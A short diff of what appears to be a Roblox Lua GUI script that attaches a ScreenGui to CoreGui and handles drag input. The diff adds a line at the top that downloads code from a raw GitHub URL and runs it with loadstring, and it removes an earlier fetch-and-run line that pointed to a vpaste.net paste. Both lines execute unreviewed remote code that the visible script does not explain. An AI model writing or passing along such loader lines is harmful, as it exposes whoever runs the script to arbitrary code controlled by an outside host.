@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vhigiyfhh/Spawner/refs/heads/main/Spawner2",true))()
+
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = game:GetService("CoreGui")
 
@@ -185,5 +187,3 @@ UIS.InputChanged:Connect(function(input)
         update(input)
     end
 end)
-
-loadstring(game:HttpGet("http://vpaste.net/uBMsl"))()
